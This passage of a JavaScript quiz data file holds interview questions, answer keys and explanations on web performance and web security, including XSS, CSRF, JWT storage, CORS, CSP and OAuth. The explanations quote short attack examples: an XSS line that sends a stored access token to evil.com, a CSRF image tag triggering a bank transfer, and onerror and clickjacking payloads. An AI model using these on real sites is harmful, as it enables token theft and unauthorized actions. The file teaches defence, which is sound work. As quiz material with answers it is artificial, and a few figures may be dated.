  { q: "How does next/image improve performance over a plain <img> tag?", opts: ["It's just a wrapper with no benefits", "Auto-generates WebP/AVIF, resizes to exact display size, lazy loads by default, prevents CLS with reserved dimensions, uses Blur placeholder, serves from CDN", "Only adds lazy loading", "Only converts to WebP"], correct: 1, explain: "next/image does all of this automatically: format conversion (WebP/AVIF), responsive sizes via srcset, lazy loading (except priority images), automatic width/height to prevent CLS, blur-up placeholder, and serves via Vercel's image optimization CDN. A single component replaces weeks of manual optimization." },
  { q: "A product page has 20 product images. Which loading strategy is correct?", opts: ["loading='eager' on all", "loading='lazy' on all product images, fetchpriority='high' only on the hero/first image above the fold", "loading='lazy' on everything including hero", "No loading attribute needed"], correct: 1, explain: "Above-fold images (hero, first product): no lazy loading, optionally fetchpriority='high'. Below-fold images (rest of products): loading='lazy'. This prioritizes what users see immediately while deferring what they don't. Using lazy on the hero image is one of the most common LCP mistakes." },
],

'pi-lighthouse': [
  { q: "A page scores 72 in Lighthouse Performance. Which metric should you fix first?", opts: ["Accessibility — it's failing", "Find the metric with the highest weight causing your score drop: LCP and TBT have the most weight. Fix whichever is furthest from target first.", "Fix all metrics equally", "The one Lighthouse marks in red"], correct: 1, explain: "Lighthouse Performance weights (approximate): LCP 25%, TBT 30%, CLS 15%, FCP 10%, Speed Index 10%, TTI 10%. TBT (Total Blocking Time) has the highest weight — long JavaScript tasks hurt it most. LCP is usually the most visible to users. Address whichever is worst." },
  { q: "What is the difference between Lighthouse and CrUX data?", opts: ["They measure the same thing", "Lighthouse: synthetic test on your machine in controlled conditions. CrUX: real user data from millions of Chrome users — includes real devices, networks, geographies.", "CrUX is more accurate for your computer", "Lighthouse uses real user data"], correct: 1, explain: "Lighthouse runs on your fast dev machine on a fast connection (even with throttling simulation). CrUX is 28 days of real Chrome users — P75 (75th percentile). A page can score 95 in Lighthouse but fail Core Web Vitals in CrUX if real users have slow devices. Always check both." },
  { q: "Lighthouse shows 'Eliminate render-blocking resources'. What are these and how do you fix them?", opts: ["Images blocking render", "External CSS and sync <script> tags that pause HTML parsing — browser can't render until these download and execute. Fix: async/defer scripts, inline critical CSS, preload.", "Server-side resources", "API calls blocking render"], correct: 1, explain: "Render-blocking: CSS (always blocks render until loaded), sync scripts (block parse AND render). Fix strategies: 1) Inline critical CSS in <head>. 2) Load non-critical CSS with media='print' onload hack. 3) Add defer/async to scripts. 4) Move scripts to end of body. Each fix reduces Time to First Contentful Paint." },
  { q: "What does Lighthouse's 'Opportunities' section show vs 'Diagnostics'?", opts: ["They show the same thing", "Opportunities: specific fixes with estimated savings (seconds/KB). Diagnostics: best practice violations that may or may not affect performance score directly.", "Diagnostics are more important", "Opportunities are only for mobile"], correct: 1, explain: "Opportunities: 'Properly size images — potential savings of 1.2MB' with specific images listed. These have direct score impact with quantified savings. Diagnostics: 'Does not use HTTP/2', 'Avoid enormous network payloads' — important but less directly tied to the 6 scored metrics." },
  { q: "How do you use Lighthouse CI to prevent performance regressions in a CI/CD pipeline?", opts: ["Run Lighthouse manually before each deploy", "Install @lhci/cli, run lhci autorun in CI, configure lighthouserc.js with assertion thresholds — build fails if LCP > 2.5s or Performance < 90", "Only check Lighthouse scores monthly", "Lighthouse CI requires a paid plan"], correct: 1, explain: "Lighthouse CI runs automated audits on every PR/deploy. lighthouserc.js: assert: { assertions: { 'categories:performance': ['error', {minScore: 0.9}], 'first-contentful-paint': ['warn', {maxNumericValue: 2000}] } }. PR fails if thresholds exceeded. This catches regressions before they reach users." },
],

'pi-caching': [
  { q: "What is the difference between Cache-Control: max-age=3600 and Cache-Control: no-cache?", opts: ["no-cache means never cache", "max-age=3600: serve from cache for 3600s without asking server. no-cache: ALWAYS revalidate with server before serving (but MAY use cached version if server says 304 Not Modified)", "They are the same", "no-cache is for private data only"], correct: 1, explain: "max-age=3600: browser serves cached version for 1 hour — no network request at all. no-cache: browser must check with server every time (If-None-Match/ETag), but server can respond 304 (use your cache) which is fast. no-store: truly never cache, always fresh full download." },
  { q: "What is the Cache-Control: immutable directive and when should you use it?", opts: ["Prevents cache from ever expiring", "Tells browser the response will NEVER change — skip revalidation even on page refresh. Use ONLY with content-hashed filenames.", "Prevents CDN caching", "Makes cache permanent across browser sessions"], correct: 1, explain: "Cache-Control: max-age=31536000, immutable on main.a3f9c2.js — browser caches for 1 year and never revalidates (even on Ctrl+F5). Safe because the filename hash changes when content changes. Without immutable, browsers revalidate on every refresh even within max-age." },
  { q: "How does ETag-based caching work?", opts: ["ETag encrypts the response", "Server sends ETag header (hash of content). Browser caches response + ETag. Next request: browser sends If-None-Match: etag-value. Server checks: same content? Returns 304 (no body) — fast. Changed? Returns 200 + new content + new ETag.", "ETags are only for images", "ETag is a browser-side technology"], correct: 1, explain: "ETag flow: GET /api/user → 200 + ETag: 'abc123' + body. Cache for 60s. After 60s: GET /api/user + If-None-Match: 'abc123' → if unchanged: 304 Not Modified (no body, tiny response) → browser uses cached body. Changed: 200 + new ETag + new body." },
  { q: "What does a Service Worker cache enable that HTTP Cache-Control cannot?", opts: ["Nothing extra", "Offline functionality, programmatic cache control, background sync, and serving custom responses — SW intercepts ALL fetch requests with full JavaScript control", "Faster HTTP responses", "CDN integration"], correct: 1, explain: "HTTP Cache-Control: browser decides, limited control. Service Worker: you write JavaScript that intercepts every fetch. Strategies: Cache First (offline-first apps), Network First (fresh data with offline fallback), Stale-While-Revalidate (instant + fresh). Workbox automates common patterns." },
  { q: "What is the optimal caching strategy for each resource type?", opts: ["Same strategy for all resources", "HTML: no-cache (revalidate always). CSS/JS with hash: max-age=31536000, immutable. CSS/JS without hash: max-age=600. Images: max-age=86400. API: no-cache or short max-age.", "Cache everything for 1 year", "Never cache API responses"], correct: 1, explain: "Strategy by resource: HTML (entry point, must be fresh): Cache-Control: no-cache. Hashed assets (main.abc123.js): max-age=31536000, immutable — hash changes on deploy. API responses: depends on staleness tolerance — short max-age + stale-while-revalidate for most. CDN: s-maxage for edge caching." },
],

'pi-rendering': [
  { q: "A marketing landing page changes content once per week. What rendering strategy gives the best performance?", opts: ["SSR — freshest content", "SSG — build once, serve from CDN, fastest possible load time for content that rarely changes", "CSR — simplest to implement", "ISR with revalidate=60"], correct: 1, explain: "SSG: page built at deploy time → served from CDN edge → zero server computation per request → fastest TTFB (<50ms vs SSR's 200-500ms). For content changing weekly, rebuilding on content change (or ISR with revalidate=604800) is optimal. SSR wastes server resources for identical responses." },
  { q: "When is SSR the correct choice over SSG?", opts: ["Always — fresher is better", "When content is user-specific (dashboard, account page) or changes more frequently than you can rebuild — SSR generates fresh HTML per request with user context", "SSR is never correct", "Only for authentication pages"], correct: 1, explain: "SSR use cases: personalized pages (user's dashboard shows their data), real-time data (stock prices, live scores), auth-gated content (can't pre-render without knowing the user). If 1000 users get 1000 different pages, SSG can't help — you need SSR or CSR." },
  { q: "What is ISR (Incremental Static Regeneration) and what problem does it solve?", opts: ["A React hook for rendering", "Pre-renders pages at build time but regenerates them in the background after a revalidation period — static speed + freshness without full SSR cost", "Client-side rendering with caching", "A Webpack optimization"], correct: 1, explain: "ISR: page is static (CDN-cached, fast). After revalidate seconds, next request triggers background regeneration. User gets stale-but-fast response; next user gets fresh regenerated page. Solves: SSG is too stale, SSR is too slow. Next.js: export const revalidate = 3600 in Server Components." },
  { q: "A social media feed shows real-time posts. New posts appear every few seconds. What is the best rendering approach?", opts: ["SSG — pre-render all posts", "SSR for initial load (first N posts, SEO), then CSR for updates (WebSocket or polling) — hybrid approach", "CSR only with no SSR", "ISR with revalidate=1"], correct: 1, explain: "Hybrid: SSR initial page load (SEO + fast first paint with recent posts). After hydration: WebSocket/SSE stream pushes new posts client-side. ISR with revalidate=1 is wasteful (rebuild every second). CSR-only misses SEO. The hybrid gives SEO + real-time updates." },
  { q: "What is streaming SSR and how does it improve perceived performance?", opts: ["SSR that streams CSS", "Send HTML in chunks as it renders — user sees above-fold content immediately while below-fold data is still fetching on server. React 18 + Next.js 13+ support this.", "Sending JS in smaller chunks", "A CDN streaming protocol"], correct: 1, explain: "Traditional SSR: wait for ALL data → render complete HTML → send. Streaming SSR: immediately send HTML shell + above-fold content → stream each section as its data resolves. User sees content sooner. React 18's Suspense boundaries define the streaming boundaries — each resolves independently." },
],

'pi-compression': [
  { q: "What is the difference between Gzip and Brotli compression?", opts: ["They are identical algorithms", "Brotli: newer (Google, 2015), better compression ratio (15-25% smaller than Gzip), slower to compress, faster to decompress. Gzip: universal support, faster compression. Use Brotli for static assets, Gzip as fallback.", "Gzip is better for JavaScript", "Brotli only works for images"], correct: 1, explain: "Brotli compresses ~15-25% better than Gzip for typical web assets. A 300KB JS bundle: Gzip → ~100KB, Brotli → ~80KB. Brotli is slower to compress (pre-compress static assets at build time). All modern browsers support Brotli. Check: Accept-Encoding header. Server responds with Content-Encoding: br." },
  { q: "How does HTTP/2 multiplexing improve performance compared to HTTP/1.1?", opts: ["HTTP/2 compresses more", "HTTP/2 sends multiple requests over ONE connection simultaneously — no 6-connection limit, no head-of-line blocking per domain, no request queuing", "HTTP/2 is faster for large files only", "HTTP/2 removes the need for CDNs"], correct: 1, explain: "HTTP/1.1: max 6 parallel connections per domain. 20 assets = queue in groups of 6. HTTP/2: one TCP connection, multiplexes all requests as binary frames. 20 assets start simultaneously. Also: header compression (HPACK), server push (deprecated), binary protocol. Most CDNs and servers support HTTP/2 today." },
  { q: "What is QUIC/HTTP/3 and what problem does it solve that HTTP/2 doesn't?", opts: ["A faster version of Brotli", "HTTP/3 uses UDP (QUIC) instead of TCP — eliminates TCP head-of-line blocking where one lost packet stalls ALL streams on the connection", "HTTP/3 adds multiplexing", "HTTP/3 is only for mobile"], correct: 1, explain: "HTTP/2 problem: multiplexes over ONE TCP connection. One lost packet → TCP retransmission → ALL streams wait (head-of-line blocking at transport layer). HTTP/3/QUIC: each stream independent at transport layer. One lost packet only stalls that stream. Especially beneficial on mobile with higher packet loss." },
  { q: "How do you verify that Brotli compression is working for your site?", opts: ["Check the file size on disk", "Open DevTools Network tab → click any JS/CSS request → Response Headers → check Content-Encoding: br (Brotli) or gzip. Also check Size vs Transferred columns.", "Run Lighthouse", "Check server logs"], correct: 1, explain: "Response headers tell you everything: Content-Encoding: br = Brotli active. Content-Encoding: gzip = Gzip active. No Content-Encoding header = no compression (major problem!). Network tab Size vs Transferred: Size=400KB, Transferred=120KB means 70% compression. Equal values = no compression." },
  { q: "What is HTTP/2 header compression (HPACK) and why does it matter?", opts: ["It compresses response bodies", "Compresses repetitive HTTP headers across requests — browser-server maintain a shared header table, subsequent requests send diffs instead of full headers. Saves 30-40% on header overhead.", "It's the same as Gzip", "HPACK compresses cookies only"], correct: 1, explain: "HTTP/1.1: every request sends full headers (200-2000 bytes) — method, path, Accept, Cookie, User-Agent, Cache-Control — repeated identically on every request. HTTP/2 HPACK: first request sends full headers, subsequent requests send only changed headers as indexed diffs. Especially impactful for APIs with many requests." },
],

'si-xss': [
  { q: "What are the three types of XSS and how do they differ?", opts: ["SQL, NoSQL, DOM", "Stored (persisted in DB, affects all users), Reflected (in URL/params, affects one request), DOM-based (client-side JS manipulates DOM with untrusted input)", "Client, Server, Network XSS", "Active, Passive, Persistent XSS"], correct: 1, explain: "Stored XSS: attacker saves script in DB (comment, profile) — every visitor who views it gets attacked. Reflected XSS: malicious script in URL param, server reflects it back in response — requires tricking user to click malicious URL. DOM XSS: client-side JS reads attacker-controlled input (URL hash, postMessage) and writes to DOM unsafely." },
  { q: "Which React API is directly dangerous for XSS and what is the safe alternative?", opts: ["useState — use useRef instead", "dangerouslySetInnerHTML — only safe with DOMPurify sanitization first. Use {userContent} (JSX interpolation) instead when possible.", "useEffect — use useMemo instead", "fetch — use axios instead"], correct: 1, explain: "dangerouslySetInnerHTML={{ __html: userInput }} parses HTML and executes scripts. JSX interpolation {userInput} uses textContent — never parses HTML, always safe. If you MUST render HTML (rich text editor output), sanitize first: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(input) }}." },
  { q: "A Content Security Policy header contains: script-src 'self'. An XSS payload of <script src='https://evil.com/xss.js'> is injected. Does CSP block it?", opts: ["No — CSP doesn't block scripts", "Yes — 'self' only allows scripts from the same origin. evil.com is a different origin — CSP blocks the script load and reports the violation.", "Only if the script is inline", "Only in Chrome"], correct: 1, explain: "script-src 'self' whitelists only scripts from the same domain. Any script from a different origin (evil.com) is blocked by the browser before it executes. CSP is a defense-in-depth layer — even if XSS injection succeeds, CSP prevents script execution." },
  { q: "What is DOM-based XSS and why is it harder to detect with server-side scanning?", opts: ["XSS that only works in the DOM", "Attack payload never goes through the server — attacker puts script in URL fragment (#) or postMessage, client-side JS reads it and writes to innerHTML. Server never sees the payload.", "XSS that uses document.cookie", "XSS that bypasses the DOM entirely"], correct: 1, explain: "DOM XSS: location.hash = '#<img onerror=alert(1) src=x>'. Server logs show a normal request (fragment never sent to server). Client-side: element.innerHTML = location.hash — script executes. Traditional WAFs (Web Application Firewalls) and server logs don't see DOM XSS. Requires client-side static analysis and avoiding dangerous sinks." },
  { q: "What are 'dangerous sinks' in DOM-based XSS?", opts: ["Slow database queries", "DOM APIs that parse and execute HTML/JS: innerHTML, outerHTML, document.write(), eval(), setTimeout(string), element.src, element.href with javascript:", "Network endpoints that accept untrusted input", "CSS properties that animate too fast"], correct: 1, explain: "Dangerous sinks are APIs where attacker-controlled data causes code execution: innerHTML/outerHTML (parse HTML → execute scripts), eval/Function('code') (execute JS directly), setTimeout/setInterval with string (eval equivalent), href/src with javascript: protocol. Safe sinks: textContent, setAttribute (for data-* attrs), createElement." },
],

'si-csrf': [
  { q: "Explain a CSRF attack. What exactly does the attacker exploit?", opts: ["A SQL injection variant", "Browser automatically sends cookies with cross-origin requests — attacker tricks authenticated user into visiting evil.com which sends a request to bank.com. Browser includes auth cookie automatically.", "A JavaScript vulnerability", "A server-side exploit"], correct: 1, explain: "CSRF exploits automatic cookie sending. User is logged into bank.com (has session cookie). Attacker's evil.com has: <img src='https://bank.com/transfer?to=attacker&amount=1000'>. Browser loads page → browser sends request to bank.com WITH the session cookie → bank thinks it's the user. No JS required from the attacker." },
  { q: "How does SameSite=Strict prevent CSRF?", opts: ["It encrypts the cookie", "Browser does NOT send the cookie when request originates from a different site — attacker's evil.com request arrives at bank.com with no session cookie → treated as unauthenticated", "It validates the cookie signature", "It only allows same-domain cookie access"], correct: 1, explain: "SameSite=Strict: cookie only sent when navigating within the same site. Requests from evil.com to bank.com → no cookie. SameSite=Lax: cookie sent on top-level GET navigation (clicking a link) but not on sub-resource requests (img, form POST, AJAX) — blocks most CSRF but allows normal link navigation." },
  { q: "What is the Synchronizer Token Pattern (CSRF token) and how does it work?", opts: ["Token in the JWT", "Server generates random token, stores in session, sends to client in hidden form field or header. Every state-changing request must include matching token — attacker can't read it due to same-origin policy.", "OAuth access token", "Cookie with random value"], correct: 1, explain: "Server: generate token, store in session, include in every form as <input type='hidden' name='csrf' value='TOKEN'>. Browser submits form → server compares submitted token to session token. Match = legitimate. Missing/wrong = reject. Attacker can't read the token from evil.com (same-origin policy blocks cross-origin reads)." },
  { q: "What is the Double Submit Cookie pattern?", opts: ["Using two session cookies", "Set a non-httpOnly cookie (readable by JS) with random token. JS reads it and includes in request header. Server checks cookie value matches header value — attacker can't read cookie due to same-origin policy.", "Submitting forms twice for verification", "Using both a cookie and localStorage token"], correct: 1, explain: "Server sets: Set-Cookie: csrf=RANDOM_TOKEN (NOT httpOnly — intentionally readable by JS). Client JS reads document.cookie for csrf token, sends as X-CSRF-Token header. Server verifies header matches cookie. Attacker on evil.com can't read the cookie (SOP) so can't set the matching header. Stateless — no session storage needed." },
  { q: "Modern SPAs with JWT in Authorization header — do they need CSRF protection?", opts: ["Yes — always need CSRF tokens", "No — CSRF exploits automatic cookie sending. If auth uses Authorization: Bearer JWT header (set by JS), browsers don't send it automatically to other origins — no CSRF risk.", "Only for POST requests", "Only if using React"], correct: 1, explain: "CSRF requires the browser to automatically attach credentials. Cookies: automatically attached (CSRF risk). Authorization headers: MUST be set by JavaScript — a cross-origin attacker's page can't set your Authorization header (SOP). SPAs using Bearer tokens in headers are naturally CSRF-immune for API calls. CSRF risk remains if you use cookies for API auth." },
],

'si-jwt': [
  { q: "What is the 'none' algorithm attack in JWT?", opts: ["Using no JWT at all", "Attacker changes JWT header algorithm to 'none' and removes signature. If server accepts alg:none, it skips verification — attacker can forge any payload with full access.", "A denial of service attack", "JWT with no expiry claim"], correct: 1, explain: "JWT structure: header.payload.signature. header: {alg:'HS256'}. Attacker changes to {alg:'none'}, removes signature, modifies payload to {role:'admin'}. Vulnerable servers check: alg=none → skip signature verification → accept forged token. Fix: NEVER accept alg from token header — always specify algorithm explicitly on the server." },
  { q: "Why is storing JWT access tokens in localStorage vulnerable?", opts: ["localStorage is too slow", "Any JavaScript on the page can read localStorage — an XSS vulnerability exposes all tokens to attackers. document.cookie with httpOnly can't be read by JS at all.", "localStorage has a 5MB limit", "JWTs are too large for localStorage"], correct: 1, explain: "XSS + localStorage = complete token theft. Attacker's injected script: fetch('https://evil.com?token=' + localStorage.getItem('access_token')). Token exfiltrated. Attacker makes API calls as the victim. httpOnly cookies: even with XSS, document.cookie returns empty string for httpOnly cookies — JS cannot read them." },
  { q: "What is refresh token rotation and why does it detect token theft?", opts: ["Periodically changing the refresh token secret", "Each refresh token use issues a NEW refresh token and invalidates the old one. Reuse of an already-used refresh token signals theft — server revokes ALL tokens for that user.", "Refreshing JWTs every minute", "Rotating between multiple refresh tokens"], correct: 1, explain: "Rotation: use refresh token → server issues new access + new refresh token + marks old refresh as used. If attacker steals and uses refresh token first: legitimate user's next refresh hits the already-used token → server detects reuse → revokes all refresh tokens for this user → both attacker and user must re-login. Automatic breach detection." },
  { q: "What is the recommended storage strategy for JWTs in a browser?", opts: ["localStorage for access token, sessionStorage for refresh token", "Access token: in-memory JS variable (short-lived, lost on refresh). Refresh token: httpOnly Secure SameSite=Strict cookie (can't be read by JS, not accessible to XSS).", "Both in httpOnly cookies", "Both in sessionStorage"], correct: 1, explain: "Access token in memory (not storage): XSS can't find it, lost on page refresh (use refresh token to get new one — acceptable UX). Refresh token in httpOnly cookie: JS can't read it, automatically sent to your domain, SameSite=Strict prevents CSRF. This pattern combines XSS safety (httpOnly) with CSRF safety (SameSite)." },
  { q: "A JWT has exp claim of 2 hours. User's role changes from 'admin' to 'viewer'. What is the security problem?", opts: ["JWT is too long", "JWTs are stateless and self-contained — server can't invalidate them before expiry. User keeps admin access for up to 2 hours after role change.", "The exp claim is in the wrong format", "Nothing — JWT handles this automatically"], correct: 1, explain: "Stateless JWTs can't be revoked before expiry. Fix options: 1) Short access token expiry (15min) — role change takes effect quickly. 2) Token blacklist in Redis — server checks if jti (token ID) is blacklisted. 3) Opaque tokens with DB lookup each request (trades stateless benefit for revocability). Each trade-off chosen based on security requirements." },
],

'si-cors': [
  { q: "What is the Same-Origin Policy and what does it restrict?", opts: ["A CSS rule preventing cross-origin styles", "Browsers block JavaScript from reading responses from different origins (different protocol, domain, or port) — prevents malicious sites from reading your data using your credentials", "A server-side security rule", "An HTTP header that blocks cross-origin requests"], correct: 1, explain: "SOP: script on evil.com cannot read responses from bank.com. This prevents: stealing session data, reading private API responses, exfiltrating user data. Note: SOP blocks READS not WRITES — cross-origin requests (form POST, img load) are still sent, just the response is blocked. CORS is a controlled exception to SOP." },
  { q: "What triggers a CORS preflight request and what is it?", opts: ["Any cross-origin request", "Non-simple requests (custom headers, non-GET/POST, JSON content-type) trigger an OPTIONS preflight. Browser asks server: 'Will you allow this cross-origin request?' before sending actual request.", "Only POST requests trigger preflight", "Only requests with cookies trigger preflight"], correct: 1, explain: "Simple requests (GET/POST with simple headers) go directly. Non-simple requests trigger preflight OPTIONS: browser sends Origin, Access-Control-Request-Method, Access-Control-Request-Headers. Server responds with what it allows. If allowed, browser sends actual request. If blocked, browser never sends actual request — CORS block happens at preflight." },
  { q: "An API server returns Access-Control-Allow-Origin: *. A request includes credentials (cookies). What happens?", opts: ["Request succeeds — wildcard allows everything", "Browser blocks the request — wildcard (*) and credentials are incompatible. Must specify exact origin: Access-Control-Allow-Origin: https://app.example.com when using credentials.", "Cookies are automatically stripped", "Request succeeds but cookies are ignored"], correct: 1, explain: "Wildcard + credentials = browser error: 'Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true'. Security reason: wildcard means ANY site could read credentialed responses — too dangerous. For credentialed requests: specify exact origin AND Access-Control-Allow-Credentials: true." },
  { q: "What security risk does a permissive CORS config create? (e.g., allowing all origins)", opts: ["Slower performance", "Any malicious website can make authenticated API calls using the victim's cookies and read the responses — effectively bypassing same-origin policy protections", "SSL certificates break", "Increased server load"], correct: 1, explain: "Attacker's evil.com with permissive CORS: fetch('https://api.yourapp.com/user/profile', {credentials:'include'}) → browser sends request WITH user's cookies → server responds with user data → evil.com's JS reads the response. CORS misconfiguration is OWASP Top 10. Always whitelist specific trusted origins." },
  { q: "What is the difference between CORS and CSRF — both involve cross-origin requests?", opts: ["They are the same attack", "CORS: controls whether cross-origin JS can READ responses. CSRF: exploits cross-origin requests being SENT with cookies automatically — CORS doesn't prevent CSRF because CSRF doesn't need to read the response.", "CSRF is server-side, CORS is client-side", "CORS is newer than CSRF"], correct: 1, explain: "CORS prevents reading: evil.com JS can't read bank.com API responses. CSRF exploits sending: evil.com's form POST sends a request to bank.com WITH the user's cookie (browser attaches automatically) — doesn't need to read the response (just trigger the action). CORS and CSRF protect against different threats — both are needed." },
],

'si-csp': [
  { q: "What does Content-Security-Policy: default-src 'self' do?", opts: ["Allows all content from any source", "Restricts ALL resource types (scripts, styles, images, fonts, etc.) to only load from the same origin — any other source is blocked by the browser", "Only restricts JavaScript", "Enables HTTPS only"], correct: 1, explain: "default-src is the fallback for any directive not explicitly set. 'self' means same origin only. Effect: <script src='https://cdn.com/lib.js'> blocked. <img src='https://images.com/photo.jpg'> blocked. Inline scripts blocked. This is strict — start here then add specific allowances with other directives." },
  { q: "What is nonce-based CSP and why is it better than allowlisting domains?", opts: ["A number used once in cryptography", "Server generates a random nonce per request, includes it in CSP header and on legitimate script tags. Only scripts with matching nonce execute — injected scripts have no nonce.", "A type of CSRF token", "A session identifier"], correct: 1, explain: "Domain allowlist problem: <script src='https://cdn.trusted.com/evil.js'> passes CSP if cdn.trusted.com is allowlisted. Nonce: CSP: script-src 'nonce-abc123'. Server adds nonce to legitimate scripts: <script nonce='abc123'>. Injected scripts have no nonce → blocked. Each page load gets a new random nonce — even if attacker knows the format, can't predict next value." },
  { q: "What is the CSP report-uri directive used for?", opts: ["Reporting server errors", "Browser sends JSON report to specified URL whenever CSP violation occurs — enables monitoring injection attempts without yet blocking them (use report-only mode first)", "Logging all HTTP requests", "Reporting to Google"], correct: 1, explain: "Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations — browser enforces nothing but reports all violations. Use to: 1) Test CSP before enforcing. 2) Monitor for attacks in production. 3) Catch legitimate resources you forgot to allowlist. Transition: Report-Only → fix violations → enforce with Content-Security-Policy." },
  { q: "A CSP header includes: script-src 'unsafe-inline'. What does this defeat?", opts: ["CSRF protection", "Inline script protection — the primary purpose of CSP. Inline scripts are the most common XSS vector. 'unsafe-inline' re-enables them, making CSP nearly useless against XSS.", "CORS protection", "Cookie security"], correct: 1, explain: "'unsafe-inline' allows: <script>malicious code</script> and onerror= handlers to execute. This is the exact attack CSP exists to prevent. Many developers add 'unsafe-inline' because their app has inline scripts that break — the correct fix is move inline scripts to files or use nonces. Never add 'unsafe-inline' to script-src." },
  { q: "How do you implement a strict CSP in an Express app?", opts: ["It's automatic", "Use helmet.contentSecurityPolicy() middleware — configure directives. Use nonces for inline scripts. Use report-uri for violation monitoring.", "Add a meta tag in HTML", "Configure it in package.json"], correct: 1, explain: "Express with helmet: app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\", (req, res) => `'nonce-${res.locals.nonce}'`], styleSrc: [\"'self'\", \"'unsafe-inline'\"], imgSrc: [\"'self'\", 'data:', 'https:'], reportUri: '/csp-report' }}));" },
],

'si-headers': [
  { q: "What does HSTS (HTTP Strict Transport Security) do?", opts: ["Forces HTTP connections", "Tells browsers to ONLY access the domain over HTTPS for the specified max-age — even if user types http:// or clicks an http:// link, browser automatically upgrades to HTTPS without a request", "Encrypts cookies", "Prevents XSS attacks"], correct: 1, explain: "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. After browser sees this header: any subsequent http:// request to this domain → browser converts to https:// before sending — no roundtrip. Protects against SSL stripping attacks. Preload list: browser ships with your domain hardcoded as HTTPS-only." },
  { q: "What does X-Frame-Options: DENY prevent?", opts: ["Cross-origin script execution", "Clickjacking — attacker embeds your site in an iframe on evil.com, overlays invisible buttons on top, tricks users into clicking things they can't see on your site (confirm actions, button clicks)", "SQL injection", "Cookie theft"], correct: 1, explain: "Clickjacking: evil.com has <iframe src='bank.com/transfer' style='opacity:0'> positioned over a 'Click to win' button. User thinks they click to win but actually click the bank's transfer button. X-Frame-Options: DENY prevents any site from embedding your page in an iframe. Modern alternative: CSP frame-ancestors 'none'" },
  { q: "What does X-Content-Type-Options: nosniff do?", opts: ["Prevents MIME type changes", "Prevents browsers from MIME-sniffing — inferring content type from file content rather than Content-Type header. Prevents: serving a .jpg file with JS inside as script", "Blocks content from other types", "Sets the content type automatically"], correct: 1, explain: "Without nosniff: browser might execute a file served as image/jpeg if the content looks like JavaScript (MIME sniffing). X-Content-Type-Options: nosniff forces browser to use the declared Content-Type. Prevents: upload a .jpg file containing JS → trick browser into executing it as script. Simple one-line protection." },
  { q: "What does Referrer-Policy: strict-origin-when-cross-origin do?", opts: ["Blocks all referrer headers", "Sends full URL as referrer within same origin, only the origin (no path/query) for cross-origin requests — prevents leaking sensitive URL params to third parties", "Sends no referrer anywhere", "Sends full referrer to all origins"], correct: 1, explain: "Without policy: GET https://app.com/checkout?code=SECRET sends Referer: https://app.com/checkout?code=SECRET to any embedded resource (analytics, CDN). With strict-origin-when-cross-origin: cross-origin requests only receive https://app.com — no path, no query params. Prevents leaking tokens, user IDs, and sensitive params in URLs to third-party analytics." },
  { q: "What is the Permissions-Policy header used for?", opts: ["Managing user permissions in React", "Controls which browser features (camera, microphone, geolocation, payment) are available to the page and iframes — restricts what third-party scripts can access", "Setting CORS permissions", "Managing cookie permissions"], correct: 1, explain: "Permissions-Policy: camera=(), microphone=(), geolocation=(self) — disables camera and microphone entirely, allows geolocation only from same origin. Prevents malicious third-party scripts or compromised CDN libraries from accessing sensitive device APIs. Replaces the older Feature-Policy header." },
],

'si-oauth': [
  { q: "What is the Authorization Code flow and why is it more secure than Implicit flow?", opts: ["They are equally secure", "Auth Code: server exchanges code for token (client_secret stays on server, never exposed). Implicit: access token returned directly in URL fragment — visible in browser history, logs, referrer headers.", "Implicit flow is more secure", "Auth Code is only for mobile apps"], correct: 1, explain: "Auth Code flow: redirect → provider → auth code in URL → YOUR SERVER exchanges code + client_secret for tokens. Token exchange is server-to-server — client_secret never leaves server. Implicit (deprecated): token returned in URL hash — visible in history, logs. Auth Code keeps secrets server-side." },
  { q: "What is PKCE and why is it required for SPAs and mobile apps?", opts: ["A password hashing algorithm", "Proof Key for Code Exchange — SPAs can't store client_secret safely (visible in source). PKCE replaces the secret with a cryptographic challenge generated per-request.", "A JWT signing algorithm", "A two-factor authentication method"], correct: 1, explain: "PKCE: SPA generates code_verifier (random secret), hashes it to code_challenge. Sends code_challenge to OAuth server. On code exchange, sends original code_verifier. Server verifies hash matches. Even if attacker intercepts the auth code, they can't exchange it without the code_verifier. No client_secret needed — secure for public clients." },
  { q: "What is the state parameter in OAuth and what attack does it prevent?", opts: ["Application state serialization", "A random value sent with auth request and returned by provider. App verifies it matches — prevents CSRF on the OAuth callback URL where attacker tricks user into completing attacker's auth flow.", "The user's current page state", "An optional parameter for debugging"], correct: 1, explain: "OAuth CSRF: attacker starts auth flow, gets a code, sends victim the callback URL. Victim's browser completes the flow — now attacker's code is linked to victim's account. State parameter: app generates random state, stores in session, includes in auth URL. On callback, verify state matches. Attacker can't guess the state." },
  { q: "Where should the access token from OAuth be stored in a SPA?", opts: ["localStorage — easy access", "In-memory JavaScript variable — not accessible to other tabs or XSS (nothing stored in DOM-accessible storage), lost on refresh (use refresh token in httpOnly cookie to silently re-issue)", "sessionStorage — cleared on tab close", "A cookie readable by JS"], correct: 1, explain: "Access token in memory: XSS attack has access to the current page's memory but only while the script runs — harder to exfiltrate than localStorage (persistent). On refresh, use refresh token (httpOnly cookie) to get new access token silently. Never localStorage — it persists and is readable by any XSS." },
  { q: "What is token binding and the token audience claim (aud) used for?", opts: ["Binding tokens to user profiles", "aud restricts which service can use the token — a token issued for api.example.com rejected by other.example.com. Prevents token forwarding attacks where stolen token is replayed against different services.", "Binding tokens to IP addresses", "The token's creation timestamp"], correct: 1, explain: "aud (audience) claim: JWT payload includes 'aud': 'https://api.myapp.com'. When api.myapp.com validates: checks aud matches its own identifier. If same token sent to other-service.myapp.com: aud mismatch → rejected. Prevents: attacker stealing token from API A and replaying it against API B which uses the same auth server." },
],

  // ── JS Interview Round ──────────────────────────────────────────
  'ji-var-let-const': [
    { q: "What does this print?\nconsole.log(x);\nvar x = 5;", opts: ["5", "undefined", "ReferenceError", "null"], correct: 1, explain: "var is hoisted and initialized to undefined. Declaration moves up but assignment stays. console.log runs before x=5 is assigned — prints undefined." },
    { q: "What does this print?\nconsole.log(y);\nlet y = 5;", opts: ["undefined", "5", "ReferenceError: Cannot access 'y' before initialization", "null"], correct: 2, explain: "let is hoisted but NOT initialized — it is in the Temporal Dead Zone. Accessing it before the declaration throws ReferenceError." },
